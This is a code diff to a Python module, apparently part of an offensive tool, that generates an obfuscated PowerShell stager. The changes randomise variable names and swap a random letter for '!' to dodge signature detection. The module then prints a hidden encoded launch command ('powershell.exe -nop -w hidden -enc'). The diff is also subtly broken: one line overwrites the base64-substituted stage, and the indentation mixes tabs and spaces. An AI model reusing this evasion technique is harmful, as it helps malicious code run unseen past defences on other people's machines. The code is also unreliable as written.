@@ -26,9 +26,15 @@ class PsModule(ModuleObject):
                 stage1 = stage1.replace("var" + str(i), self.gen_str(random.randrange(3, 10)))
 			
         path = self.write_file(stage1)
-        stage1 = self.read_file(path).replace("A", "!")
+	letter = random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase)
+        stage1 = self.read_file(path).replace(letter, "!")
         self.delete_file(path)
+	
         stage2 = self.load_file("core/util/base64.ps1").replace("[BASE64]", stage1)
+	stage2 = self.load_file("core/util/base64.ps1").replace("[CHAR]", letter)
+	for i in range(0, 2):
+                stage2 = stage2.replace("VAR" + str(i), self.gen_str(random.randrange(3, 10)))
+		
         self.ui.print_msg("Powershell script:")
         print "powershell.exe -nop -w hidden -enc %s" % self.convert_to_unicode(stage2)
         
